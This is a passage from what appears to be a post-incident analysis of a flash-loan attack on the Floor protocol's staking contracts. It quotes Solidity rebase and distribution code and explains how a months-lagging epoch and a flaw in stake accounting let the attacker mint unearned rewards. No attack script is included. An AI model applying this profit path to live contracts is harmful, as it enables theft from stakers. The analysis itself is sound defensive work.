+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>balanceOf<span class="p">(</span><span class="k">msg.sender</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>debtBalances<span class="p">[</span><span class="k">msg.sender</span><span class="p">],</span><span class="w"> </span><span class="s2">&quot;Debt: cannot transfer amount&quot;</span><span class="p">);</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">    </span>emit<span class="w"> </span>Transfer<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>to<span class="p">,</span><span class="w"> </span>value<span class="p">);</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="p">}</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="kt">function</span><span class="w"> </span><span class="nv">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">who</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span>override<span class="p">(</span>IERC20<span class="p">,</span><span class="w"> </span>ERC20<span class="p">)</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>_gonBalances<span class="p">[</span>who<span class="p">].</span>div<span class="p">(</span>_gonsPerFragment<span class="p">);</span>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>When users stake, they receive a balance represented by <code>_gonBalances</code>. This value is calculated based on the <code>gonsPerFragment</code> at the time of staking and doesn't change afterward. sFloor token balances are calculated as <code>_gonBalances/_gonsPerFragment</code>.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cm">/**</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="cm">@notice increases sFLOOR supply to increase staking balances relative to profit_</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="cm">@param profit_ uint256</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="cm">@return uint256</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="cm">*/</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="kt">function</span><span class="w"> </span><span class="nv">rebase</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">profit_</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">epoch_</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>override<span class="w"> </span>onlyStakingContract<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rebaseAmount</span><span class="p">;</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">circulatingSupply_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>circulatingSupply<span class="p">();</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>profit_<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">        </span>emit<span class="w"> </span>LogSupply<span class="p">(</span>epoch_<span class="p">,</span><span class="w"> </span>_totalSupply<span class="p">);</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">        </span>emit<span class="w"> </span>LogRebase<span class="p">(</span>epoch_<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>index<span class="p">());</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span>_totalSupply<span class="p">;</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>circulatingSupply_<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="w">        </span>rebaseAmount<span class="w"> </span><span class="o">=</span><span class="w"> </span>profit_<span class="p">.</span>mul<span class="p">(</span>_totalSupply<span class="p">).</span>div<span class="p">(</span>circulatingSupply_<span class="p">);</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="w">        </span>rebaseAmount<span class="w"> </span><span class="o">=</span><span class="w"> </span>profit_<span class="p">;</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="w">    </span>_totalSupply<span class="w"> </span><span class="o">=</span><span class="w"> </span>_totalSupply<span class="p">.</span>add<span class="p">(</span>rebaseAmount<span class="p">);</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_totalSupply<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>MAX_SUPPLY<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="w">        </span>_totalSupply<span class="w"> </span><span class="o">=</span><span class="w"> </span>MAX_SUPPLY<span class="p">;</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a><span class="w">    </span>_gonsPerFragment<span class="w"> </span><span class="o">=</span><span class="w"> </span>TOTAL_GONS<span class="p">.</span>div<span class="p">(</span>_totalSupply<span class="p">);</span>
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a><span class="w">    </span>_storeRebase<span class="p">(</span>circulatingSupply_<span class="p">,</span><span class="w"> </span>profit_<span class="p">,</span><span class="w"> </span>epoch_<span class="p">);</span>
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>
+</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>_totalSupply<span class="p">;</span>
+</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Therefore, when conducting a <code>rebase</code> to mint new tokens, after increasing <code>_totalSupply</code>, only <code>_gonsPerFragment</code> needs to be adjusted correspondingly to increase the sFloor token balance of stakers. The gons balance of sFloor token holders never changes; it's only altered by changing <code>_gonsPerFragment</code>.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kt">struct</span><span class="w"> </span><span class="nv">Epoch</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">length</span><span class="p">;</span><span class="w"> </span><span class="c1">// in seconds</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">number</span><span class="p">;</span><span class="w"> </span><span class="c1">// since inception</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">end</span><span class="p">;</span><span class="w"> </span><span class="c1">// timestamp</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">distribute</span><span class="p">;</span><span class="w"> </span><span class="c1">// amount</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>The staking contract uses the <code>Epoch</code> structure to keep track of rebase states. An epoch is a waiting period before a staker can claim rebase rewards. The <code>length</code> of an epoch in the Floor protocol is 8 hours, meaning that a rebase can occur every 8 hours. The <code>distribute</code> field represents the amount of rewards to be distributed in that epoch, which corresponds to the <code>rebaseAmount</code>.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cm">/**</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="cm">* @notice trigger rebase if epoch over</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="cm">* @return uint256</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="cm">*/</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="kt">function</span><span class="w"> </span><span class="nv">rebase</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">bounty</span><span class="p">;</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>epoch<span class="p">.</span>end<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="k">block.timestamp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">        </span>sFLOOR<span class="p">.</span>rebase<span class="p">(</span>epoch<span class="p">.</span>distribute<span class="p">,</span><span class="w"> </span>epoch<span class="p">.</span>number<span class="p">);</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">        </span>epoch<span class="p">.</span>end<span class="w"> </span><span class="o">=</span><span class="w"> </span>epoch<span class="p">.</span>end<span class="p">.</span>add<span class="p">(</span>epoch<span class="p">.</span>length<span class="p">);</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">        </span>epoch<span class="p">.</span>number<span class="o">++</span><span class="p">;</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="kt">address</span><span class="p">(</span>distributor<span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="w">            </span>distributor<span class="p">.</span>distribute<span class="p">();</span>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="w">            </span>bounty<span class="w"> </span><span class="o">=</span><span class="w"> </span>distributor<span class="p">.</span>retrieveBounty<span class="p">();</span><span class="w"> </span><span class="c1">// Will mint floor for this contract if there exists a bounty</span>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>FLOOR<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">staked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sFLOOR<span class="p">.</span>circulatingSupply<span class="p">();</span>
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>balance<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span>staked<span class="p">.</span>add<span class="p">(</span>bounty<span class="p">))</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="w">            </span>epoch<span class="p">.</span>distribute<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
+</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="w">            </span>epoch<span class="p">.</span>distribute<span class="w"> </span><span class="o">=</span><span class="w"> </span>balance<span class="p">.</span>sub<span class="p">(</span>staked<span class="p">).</span>sub<span class="p">(</span>bounty<span class="p">);</span>
+</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>bounty<span class="p">;</span>
+</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Each epoch's rebase amount is calculated in the <code>rebase</code> function of the staking contract. This function checks if it's time for a rebase, then calls the rebase function of the sFloor token to mint new Floor tokens for the current epoch and adjusts to the next epoch.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="cm">/**</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="cm">@notice send epoch reward to staking contract</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="cm">*/</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="kt">function</span><span class="w"> </span><span class="nv">distribute</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>override<span class="w"> </span><span class="p">{</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>staking<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Only staking&quot;</span><span class="p">);</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">    </span><span class="c1">// distribute rewards to each recipient</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">    </span><span class="kt">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"> </span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>info<span class="p">.</span>length<span class="p">;</span><span class="w"> </span>i<span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>info<span class="p">[</span>i<span class="p">].</span>rate<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">            </span>treasury<span class="p">.</span>mint<span class="p">(</span>info<span class="p">[</span>i<span class="p">].</span>recipient<span class="p">,</span><span class="w"> </span>nextRewardAt<span class="p">(</span>info<span class="p">[</span>i<span class="p">].</span>rate<span class="p">));</span><span class="w"> </span><span class="c1">// mint and send tokens</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">            </span>adjust<span class="p">(</span>i<span class="p">);</span><span class="w"> </span><span class="c1">// check for adjustment</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="p">}</span>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="cm">/**</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="cm">@notice view function for next reward at given rate</span>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="cm">@param _rate uint</span>
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="cm">@return uint</span>
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="cm">*/</span>
+</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="kt">function</span><span class="w"> </span><span class="nv">nextRewardAt</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_rate</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span>override<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>floor<span class="p">.</span>totalSupply<span class="p">().</span>mul<span class="p">(</span>_rate<span class="p">).</span>div<span class="p">(</span>rateDenominator<span class="p">);</span>
+</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>The <code>distribute</code> function of the distributor contract is called to mint new Floor tokens for the staking contract. In this case, there's only one entry in <code>info</code>, which corresponds to the staking contract. The rate is set as 250/1000000, meaning that the Floor token's total supply will inflate by 0.025% every epoch.</p>
+<p>In conclusion, during a rebase, the <code>rebase</code> function calculates how much rewards to distribute for the current epoch. If the Floor token balance in the staking contract is greater than the circulating supply of sFloor tokens, the surplus becomes the <code>distribute</code> amount for the next epoch.</p>
+<h3 id="reason-for-profit">Reason for Profit</h3>
+<p>The previous section briefly explained the process of the Floor protocol staking, which seems reasonable on the surface but actually contains some issues. Specifically, the attacker's profit in this attack can be attributed to the combination of the following two reasons.</p>
+<h4 id="lagging-epoch">Lagging Epoch</h4>
+<p>As mentioned earlier, the Floor staking protocol has an epoch that occurs every 8 hours, during which token distribution takes place. Users receive more Floor tokens based on their staking ratio. In normal circumstances, users would need to wait for at least one epoch (0-8 hours) after staking to let the <code>rebase</code> process complete before they can claim their rewards by <code>unstaking</code>.</p>
+<p>However, if the <code>rebase</code> process is not executed in a timely manner (according to the code, either by directly calling the <code>rebase</code> function, invoking the <code>stake</code> function, or calling the <code>unstake</code> function with the <code>_trigger</code> parameter), which means that staking activities are infrequent and there are no bots to perform timely rebases, it results in a lagging epoch.</p>
+<p>A lagging epoch allows users to perform an immediate <code>rebase</code> and then <code>unstake</code>, acquiring more newly minted Floor tokens. In this attack, which occurred on September 5th, the staking epoch was still at May 16th, lagging behind by several months. Therefore, the attacker was able to flash loan Floor tokens in a single transaction, execute multiple <code>rebase</code> operations, and profit from the token distributed without any monetary or time cost.</p>
+<p>In theory, a lag of at least two epochs is required. The first epoch is used for staking and accumulating <code>profit</code> (as <code>stake</code> triggers one <code>rebase</code> call, but the attacker do not complete the staking before it), while the second epoch is used for <code>unstaking</code> to claim rewards (obtaining the distributed rewards set during the previous <code>rebase</code>).</p>
+<p>(However, flash loans come with fees, so it is not so easy to profit from this process.)</p>
+<h4 id="bug-in-stake-function">Bug in <code>stake</code> Function</h4>
+<p>The second issue lies within a bug in the <code>stake</code> function.</p>
+<p>Based on the previous analysis, as <code>rebase</code> increases, the number of sFloor tokens owned by users (<code>sFloor.balanceOf()</code>) increases. Through the <code>unstake</code> process, sFloor tokens can be exchanged for Floor tokens, allowing users to earn rewards. Clearly, during this process, Floor tokens also need to be minted, and the minted amount should be equivalent to the increase in sFloor tokens.</p>
+<p>From the earlier analysis, we understand that during each <code>rebase</code>, the <code>distributor</code> calls the <code>distribute</code> function to <code>mint</code> new Floor tokens. These newly minted tokens should constitute the rewards to be distributed in the next <code>rebase</code>, and they should be equal to the increase in sFloor tokens.</p>
+<p>But does this actually happen? Let's revisit how sFloor tokens are distributed.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kt">uint256</span><span class="w"> </span><span class="nv">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>FLOOR<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="kt">uint256</span><span class="w"> </span><span class="nv">staked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sFLOOR<span class="p">.</span>circulatingSupply<span class="p">();</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="kt">if</span><span class="w"> </span><span class="p">(</span>balance<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span>staked<span class="p">.</span>add<span class="p">(</span>bounty<span class="p">))</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span>epoch<span class="p">.</span>distribute<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span>epoch<span class="p">.</span>distribute<span class="w"> </span><span class="o">=</span><span class="w"> </span>balance<span class="p">.</span>sub<span class="p">(</span>staked<span class="p">).</span>sub<span class="p">(</span>bounty<span class="p">);</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>In the <code>rebase</code> function of the FloorStaking contract, it calculates the Floor token balance of the staking contract and the circulating supply of sFLOOR tokens. If the Floor balance is greater than the circulating sFloor tokens, the surplus should be the rewards to be distributed in the next epoch, and it calls the <code>rebase</code> function of the sFloor contract to distribute these rewards in the next <code>rebase</code>.</p>
+<p>This appears to be reasonable: if the quantity of Floor tokens in the staking contract exceeds the circulating supply of sFLOOR, the excess should indeed be newly minted Floor tokens to be distributed in the next epoch.</p>
+<p>However, when analyzing the attack, it becomes evident that the Floor token balance in the staking contract before the attack was significantly lower than the circulating sFloor tokens (approximately 20k), which is clearly unreasonable (imagine if all stakers decided to unstake at that moment, there would not be enough Floor tokens). Furthermore, during each <code>rebase</code>, only about 400 Floor tokens were minted, yet in the first <code>unstake</code> transaction, the attacker managed to obtain over 10k Floor tokens. These anomalies indicate that there is an issue in the contract's logic.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>FLOOR<span class="p">.</span>safeTransferFrom<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>_amount<span class="p">);</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>_amount<span class="w"> </span><span class="o">=</span><span class="w"> </span>_amount<span class="p">.</span>add<span class="p">(</span>rebase<span class="p">());</span><span class="w"> </span><span class="c1">// add bounty if rebase occurred</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_claim<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>warmupPeriod<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>_send<span class="p">(</span>_to<span class="p">,</span><span class="w"> </span>_amount<span class="p">,</span><span class="w"> </span>_rebasing<span class="p">);</span>
